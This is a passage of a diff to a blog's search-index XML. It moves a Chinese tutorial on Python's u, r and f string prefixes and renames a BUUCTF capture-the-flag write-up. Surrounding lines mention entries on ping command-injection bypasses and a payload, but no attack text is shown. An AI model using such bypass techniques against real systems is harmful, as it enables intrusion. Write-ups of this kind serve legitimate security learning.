-字符串中存在中文的字符，在前面加上u</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
-<p><strong>2.r:表示非转义的原始字符串</strong><br>
-字符串中存在\，要让它失效，要在前面加上r</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
-<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
-<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
-<p>下面看下 f-strings 的使用方法</p>
-<p>基本使用（作用：替换值）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
-      </categories>
-  </entry>
-  <entry>
     <title>ping命令执行及bypass</title>
     <url>/2020/11/27/ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Abypass/</url>
     <content><![CDATA[<p>常见bypass及一些奇淫技巧</p>
@@ -1295,6 +1274,27 @@ file -f:报错出具体内容</p>
       <categories>
         <category>web技术学习</category>
         <category>命令执行</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>python之字符串前面加u,r,f的含义</title>
+    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
+    <content><![CDATA[<p>版本 python3.6及以上</p>
+<a id="more"></a>
+<p><strong>1.u:表示unicode字符串</strong><br>
+字符串中存在中文的字符，在前面加上u</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
+<p><strong>2.r:表示非转义的原始字符串</strong><br>
+字符串中存在\，要让它失效，要在前面加上r</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
+<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
+<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
+<p>下面看下 f-strings 的使用方法</p>
+<p>基本使用（作用：替换值）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
       </categories>
   </entry>
   <entry>
@@ -2968,10 +2968,9 @@ payload:</p>
       </categories>
   </entry>
   <entry>
-    <title>Buuctf刷题记录</title>
+    <title>Buuctf刷题记录(一)</title>
     <url>/2021/01/12/Buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-0/</url>
-    <content><![CDATA[<h1>Buuctf刷题记录</h1>
-<h2 id="HCTF-2018-WarmUp"><a class="header-anchor" href="#HCTF-2018-WarmUp">¶</a>[HCTF]2018 WarmUp</h2>
+    <content><![CDATA[<h2 id="HCTF-2018-WarmUp"><a class="header-anchor" href="#HCTF-2018-WarmUp">¶</a>[HCTF]2018 WarmUp</h2>
 <p>要不是我脸皮厚 第一题就能把我劝退 🙂</p>
 <p>右键源代码得到提示</p>
 <p>访问source.php 得到源码</p>
